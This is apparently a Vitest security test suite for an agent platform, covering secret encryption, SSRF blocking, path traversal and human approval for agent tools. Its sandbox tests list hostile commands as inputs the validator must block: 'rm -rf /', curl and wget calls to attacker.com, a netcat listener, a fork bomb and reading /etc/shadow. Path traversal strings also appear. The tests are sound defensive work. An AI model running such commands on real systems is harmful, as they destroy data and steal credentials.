import { describe, it, expect, vi } from 'vitest';
import { ApiVault } from '../lib/apiVault';
import { ApiExecutionEngine } from '../lib/apiExecutionEngine';
import { SandboxManager } from '../lib/sandboxManager';
import { WorkspaceManager } from '../lib/workspaceManager';
import { AgentToolRegistry } from '@nexora/agents';

describe('Phase 10: Enterprise Security & Production Hardening Suite', () => {
  describe('1. AES-256-GCM Vault Integrity', () => {
    it('encrypts secrets producing distinct IVs, authTags, and ciphertexts', () => {
      const secret = 'sk-prod-enterprise-key-998877';
      const enc1 = ApiVault.encrypt(secret);
      const enc2 = ApiVault.encrypt(secret);

      expect(enc1.encrypted).not.toBe(secret);
      expect(enc1.iv).not.toBe(enc2.iv); // Random 96-bit IV
      expect(enc1.authTag).toBeDefined();

      const dec1 = ApiVault.decrypt(enc1);
      const dec2 = ApiVault.decrypt(enc2);
      expect(dec1).toBe(secret);
      expect(dec2).toBe(secret);
    });

    it('rejects tampered ciphertexts with authentication error', () => {
      const enc = ApiVault.encrypt('sensitive-api-token');
      const tampered = {
        ...enc,
        encrypted: enc.encrypted.slice(0, -4) + 'abcd',
      };

      expect(() => ApiVault.decrypt(tampered)).toThrow();
    });

    it('masks secrets securely for front-end presentation', () => {
      expect(ApiVault.mask('sk-1234567890abcdef1234')).toBe('sk-••••••••1234');
      expect(ApiVault.mask('short')).toBe('••••••••');
    });
  });

  describe('2. SSRF, Cloud Metadata & IP Protection', () => {
    it('blocks internal RFC 1918 IPv4 and loopback addresses', () => {
      expect(ApiExecutionEngine.isBlockedIp('127.0.0.1')).toBe(true);
      expect(ApiExecutionEngine.isBlockedIp('localhost')).toBe(true);
      expect(ApiExecutionEngine.isBlockedIp('0.0.0.0')).toBe(true);
      expect(ApiExecutionEngine.isBlockedIp('10.0.0.1')).toBe(true);
      expect(ApiExecutionEngine.isBlockedIp('192.168.1.1')).toBe(true);
      expect(ApiExecutionEngine.isBlockedIp('172.16.0.1')).toBe(true);
      expect(ApiExecutionEngine.isBlockedIp('172.31.255.255')).toBe(true);
    });

    it('blocks AWS/GCP cloud instance metadata services (169.254.169.254)', () => {
      expect(ApiExecutionEngine.isBlockedIp('169.254.169.254')).toBe(true);
      expect(ApiExecutionEngine.isBlockedIp('169.254.0.1')).toBe(true);
    });

    it('blocks IPv6 loopback and link-local ranges', () => {
      expect(ApiExecutionEngine.isBlockedIp('::1')).toBe(true);
      expect(ApiExecutionEngine.isBlockedIp('fe80::1')).toBe(true);
      expect(ApiExecutionEngine.isBlockedIp('fc00::1')).toBe(true);
    });

    it('enforces HTTPS for remote production APIs', async () => {
      await expect(
        ApiExecutionEngine.validateUrlSecurity('http://api.external.com/data', 'PRODUCTION')
      ).rejects.toThrow('Insecure protocol: HTTPS is strictly required');

      await expect(
        ApiExecutionEngine.validateUrlSecurity('https://api.github.com', 'PRODUCTION')
      ).resolves.not.toThrow();
    });
  });

  describe('3. Sandbox Command Allowlist & Injection Defense', () => {
    it('blocks shell command chaining, dangerous utilities, and root destruction', () => {
      expect(SandboxManager.validateCommand('rm -rf /').isAllowed).toBe(false);
      expect(SandboxManager.validateCommand('sudo rm -rf /var').isAllowed).toBe(false);
      expect(SandboxManager.validateCommand('curl -X POST http://attacker.com').isAllowed).toBe(false);
      expect(SandboxManager.validateCommand('wget http://attacker.com/malware.sh').isAllowed).toBe(false);
      expect(SandboxManager.validateCommand('nc -l 4444').isAllowed).toBe(false);
      expect(SandboxManager.validateCommand(':(){ :|:& };:').isAllowed).toBe(false);
      expect(SandboxManager.validateCommand('cat /etc/shadow').isAllowed).toBe(false);
    });

    it('permits authorized development scripts in workspace', () => {
      expect(SandboxManager.validateCommand('npm test').isAllowed).toBe(true);
      expect(SandboxManager.validateCommand('npm run build').isAllowed).toBe(true);
      expect(SandboxManager.validateCommand('node src/index.ts').isAllowed).toBe(true);
      expect(SandboxManager.validateCommand('python -m pytest').isAllowed).toBe(true);
    });
  });

  describe('4. Path Traversal & Filesystem Jail', () => {
    it('blocks path traversal attacks attempting to escape project directory', () => {
      expect(() => {
        WorkspaceManager.sanitizePath('proj-test', '../../etc/passwd');
      }).toThrow('Path traversal detected');

      expect(() => {
        WorkspaceManager.sanitizePath('proj-test', '..\\..\\Windows\\System32');
      }).toThrow('Path traversal detected');
    });

    it('allows valid subpaths inside the project sandbox', () => {
      const sanitized = WorkspaceManager.sanitizePath('proj-test', 'src/components/App.tsx');
      expect(sanitized).toContain('proj-test');
      expect(sanitized).toContain('src');
    });
  });

  describe('5. Agent Human-in-the-Loop Gatekeeper', () => {
    it('requires human approval for dangerous tool operations', () => {
      expect(AgentToolRegistry.requiresHumanApproval('delete_file', {}).requires).toBe(true);
      expect(AgentToolRegistry.requiresHumanApproval('install_deps', {}).requires).toBe(true);
      expect(AgentToolRegistry.requiresHumanApproval('call_connected_api', { method: 'DELETE' }).requires).toBe(true);
      expect(AgentToolRegistry.requiresHumanApproval('call_connected_api', { method: 'POST' }).requires).toBe(true);
    });

    it('allows automated execution of safe read operations', () => {
      expect(AgentToolRegistry.requiresHumanApproval('read_file', {}).requires).toBe(false);
      expect(AgentToolRegistry.requiresHumanApproval('list_files', {}).requires).toBe(false);
      expect(AgentToolRegistry.requiresHumanApproval('call_connected_api', { method: 'GET' }).requires).toBe(false);
    });
  });
});
